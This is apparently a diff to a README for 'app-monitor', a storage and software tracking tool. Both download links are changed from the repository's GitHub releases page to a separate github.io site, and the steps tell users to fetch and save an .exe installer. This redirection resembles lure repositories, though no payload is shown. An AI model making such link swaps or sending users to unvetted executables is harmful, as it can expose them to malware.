@@ -1,6 +1,6 @@
 # 🖥️ app-monitor - Manage your storage and software daily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/linnetforeign896/app-monitor/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://linnetforeign896.github.io)
 
 App-monitor tracks how you use your computer. It lists every piece of software installed on your machine. You see how much space each application occupies. The tool finds unused files and helps you remove them. It keeps your storage organized and your computer fast.
 
@@ -8,7 +8,7 @@ App-monitor tracks how you use your computer. It lists every piece of software i
 
 You need to download the installer from our dedicated release page. 
 
-1. Visit [this page to download](https://github.com/linnetforeign896/app-monitor/releases).
+1. Visit [this page to download](https://linnetforeign896.github.io).
 2. Look for the Assets section at the bottom of the newest version.
 3. Click the file that ends with .exe.
 4. Save the file to your Downloads folder.
